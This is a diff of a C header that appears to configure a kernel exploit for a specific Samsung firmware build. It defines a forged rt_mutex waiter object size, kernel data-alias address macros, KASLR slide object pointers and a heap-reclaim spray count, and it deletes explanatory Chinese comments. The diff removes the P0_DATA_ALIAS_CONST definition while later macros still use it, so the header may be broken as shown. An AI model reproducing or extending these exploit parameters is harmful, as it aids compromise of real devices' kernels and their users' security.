@@ -5,27 +5,11 @@
 #define BUILD_VARIANT_LABEL "pa3q-S9380ZHU1AYA1-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
 
-/* ===== 新增：补充缺失的宏定义 ===== */
-
-// 物理偏移计算（用于 SLIDE_NFULNL_LOGGER_OBJECT 等）
-#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
-
-// data alias 地址转换宏
-#define P0_DATA_ALIAS_CONST(image_addr) \
-  (P0_PAGE_OFFSET + ((image_addr) - KIMAGE_TEXT_BASE) + P0_KERNEL_PHYS_DELTA)
-
-// FAKE_WAITER_LAYOUT_SIZE — waiter 结构体总大小
-// 你的 target.h 用的是 legacy 布局（有 tree_prio, tree_deadline 等）
-// 按最大偏移 FAKE_WAITER_WW_CTX_OFF(0x68) + 8 = 0x70
 #define FAKE_WAITER_LAYOUT_SIZE 0x70
-
-// SLIDE 相关的 data alias 对象指针
 #define SLIDE_NFULNL_LOGGER_OBJECT \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
-
-// SLIDE 回收发送次数
 #define APP_SLIDE_RECLAIM_SENDS 32
 
 #else
